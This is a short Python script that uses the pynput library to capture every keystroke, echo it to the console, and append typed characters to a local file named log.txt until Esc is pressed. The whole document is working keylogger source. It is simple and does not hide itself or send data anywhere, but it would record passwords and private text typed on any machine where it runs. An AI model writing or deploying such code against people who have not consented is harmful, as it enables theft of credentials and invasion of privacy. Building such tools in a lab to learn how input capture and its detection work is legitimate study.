from pynput.keyboard import Key,Listener

keyCount = 0 
keys = []

def onPress(key):
    global keys, keyCount

    keys.append(key)
    keyCount += 1
    print("{0} pressed".format(key))

    if keyCount > 20:
        keyCount = 0
        writeFile(keys)
        keys.clear()

def writeFile(keys):
    with open("log.txt", "a", encoding="UTF-8") as file:
        for key in keys:
            k  = str(key).replace("'","")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press = onPress,on_release = onRelease) as listener:
    listener.join()

